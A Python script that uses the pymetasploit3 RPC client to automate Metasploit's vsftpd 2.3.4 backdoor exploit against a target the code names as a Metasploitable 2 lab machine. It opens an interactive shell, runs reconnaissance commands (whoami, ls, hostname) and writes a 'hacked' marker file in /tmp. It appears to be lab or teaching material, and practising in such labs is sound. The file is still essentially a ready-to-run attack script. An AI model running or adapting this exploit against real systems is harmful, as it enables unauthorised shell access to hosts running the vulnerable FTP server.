import time

from pymetasploit3.msfrpc import MsfRpcClient, MsfRpcError


def connect_to_metasploit(password: str) -> MsfRpcClient:
    """
    Attempts to connect to Metasploit using the pymetasploit3 API.

    Args:
        password (str): The password for msfrpcd.

    Returns:
        MsfRpcClient: A connected instance of the Metasploit client.
    """
    try:
        # Connect to the Metasploit client
        client = MsfRpcClient(password)
        print("Successfully connected to Metasploit.")
        return client
    except (ConnectionError, TimeoutError) as e:
        # Handle connection and timeout errors
        print(f"Failed to connect to Metasploit: {e}")
        return None
    except (MsfRpcError, ValueError) as e:
        # Handle specific errors related to Metasploit RPC
        print(f"Specific error occurred: {e}")
        return None


def run_exploit(client: MsfRpcClient, rhost: str) -> None:
    """
    Executes the vsftpd 2.3.4 exploit on the target machine.

    Args:
        client (MsfRpcClient): The connected Metasploit client.
        rhost (str): The IP address of the victim machine.
    """
    try:
        # Set up the exploit
        exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
        exploit['RHOSTS'] = rhost
        print(f"Exploit configured for {rhost}")

        # Set up the payload
        payload = client.modules.use('payload', 'cmd/unix/interact')
        print("Payload configured")

        # Execute the exploit
        exploit.execute(payload=payload)
        print("Running the exploit...")

        # Wait for 10 seconds to give time for the session to open
        time.sleep(10)

        # Check if a session has been opened
        if client.sessions.list:
            print("Exploitation successful. Active sessions:")
            for session_id, session_info in client.sessions.list.items():
                print(f"Session ID: {session_id}, Info: {session_info}")
                # Execute commands on the active session
                session = client.sessions.session(session_id)

                # Command 1: Check the current user
                session.write('whoami')
                time.sleep(1)
                print(f"Current user:\n{session.read()}")

                # Command 2: List files in the current directory
                session.write('ls')
                time.sleep(1)
                print(f"Files in the current directory:\n{session.read()}")

                # Command 3: Get the hostname of the victim machine
                session.write('hostname')
                time.sleep(1)
                print(f"Hostname of the machine:\n{session.read()}")

                # Command 4: Create a file on the victim machine
                session.write('echo "Hacked by pymetasploit" > /tmp/hacked.txt')
                time.sleep(1)
                print("File 'hacked.txt' created in /tmp.")
        else:
            # No session was opened
            print("Failed to obtain a session.")
    except (ConnectionError, TimeoutError) as e:
        # Handle connection and timeout errors during the exploit
        print(f"Connection or timeout error while running the exploit: {e}")
    except (MsfRpcError, ValueError) as e:
        # Handle specific errors during exploit execution
        print(f"Specific error while running the exploit: {e}")


def main():
    # Connect to Metasploit
    client = connect_to_metasploit('password')  # Use the same password set for msfrpcd

    # Proceed if the connection is successful
    if client:
        # The IP of the victim machine (Metasploitable 2)
        rhost = '192.168.0.110'

        # Run the exploit
        run_exploit(client, rhost)
    else:
        print("Cannot proceed without a connection to Metasploit.")


if __name__ == "__main__":
    main()
